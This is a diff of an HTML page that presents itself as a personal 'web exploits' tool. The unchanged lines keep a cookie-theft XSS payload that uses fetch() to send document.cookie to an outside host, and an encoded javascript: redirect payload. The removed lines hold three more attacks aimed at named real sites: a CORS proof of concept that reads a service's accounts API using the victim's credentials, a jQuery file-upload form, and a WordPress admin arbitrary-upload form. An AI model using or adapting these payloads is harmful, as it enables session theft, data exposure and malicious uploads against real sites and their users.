@@ -174,49 +174,6 @@ cookie steal xss >>        <script>fetch('https://hacker.thm/steal?cookie=' + bt
  redirect to xss >>        javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain 
 -->
 
-<center>
-<hr color=blue>
-<h1><font color=#A0FFA0>[CORS POC EXPLOIT]</font></h1>
-<h3><font color=lime>[BY m00nIsSmiling]</font></h3>
-<div id="demo">
-<button type="button" onclick="cors()">Exploit</button>
-</div>
-<script>
-function cors(){
- var xhttp = new XMLHttpRequest();
- xhttp.onreadystatechange = function(){
-  if (this.readyState ==4 && this.status == 200){
-   document.getElementById("demo").innerHTML = alert(this.responseText);
-     };
-    };
-  xhttp.open("GET", "https://miro.com/api/v1/accounts/", true);
-  xhttp.withCredentials = true;
-  xhttp.send();
-}
-</script>
-<hr color=blue>
-</body>
-<hr color=red>
-<h1>Jquery file upload exploit</h1>
-<form method="POST" action="https://www.spbakery.com.mm/wp-content/uploads/2022/02/" enctype="multipart/form-data">
-<input type="file" name="file[]"/>
-<br>
-<br>
-<button>upload</button>
-</form>
-<hr color=red>
-<hr color=green>
-<h1>wp-admin-file-upload</h1>
-<form action="https://www.spbakery.com.mm/admin.php?page=vertical_manage" method="POST" enctype="multipart/form-data">
-<input type="hidden" name="task" value="vrt_add_new_album"/>
-<input type="hidden" name="album_name" value="Arbitrary File Upload"/>
-<input type="hidden" name="album_desc" value="Arbitrary File Upload"/>
-<input type="file" name="album_img" value=""/>
-<br>
-<br>
-<input type="submit" value="Submit"/>
-</form>
-<hr color=green>
 <pre>
 + this web tool is created by "moon" +
 + use for "web exploits" +
